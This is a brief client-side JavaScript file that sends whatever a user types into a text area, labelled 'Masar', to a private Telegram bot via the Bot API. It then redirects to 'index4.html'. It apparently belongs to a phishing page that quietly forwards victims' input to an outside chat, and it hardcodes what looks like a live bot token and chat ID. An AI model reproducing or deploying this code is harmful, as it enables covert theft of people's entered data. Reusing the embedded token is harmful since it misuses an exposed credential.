async function sendMessage() {
    const textArea = document.getElementById('text-area');
    const message = `Masar: ${textArea.value}`;
    const token = '7509225299:AAF9UyvAlML4oh6u7WvCNoX0_Imo0tBkQkU';
    const chatId = '5687419212';
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });

        if (response.ok) {
            window.location.href = 'index4.html';
        } else {
            showError();
        }
    } catch (error) {
        showError();
    }
}

function showError() {
    const modal = document.getElementById('error-modal');
    modal.style.display = 'block';
}

function closeModal() {
    const modal = document.getElementById('error-modal');
    modal.style.display = 'none';
}
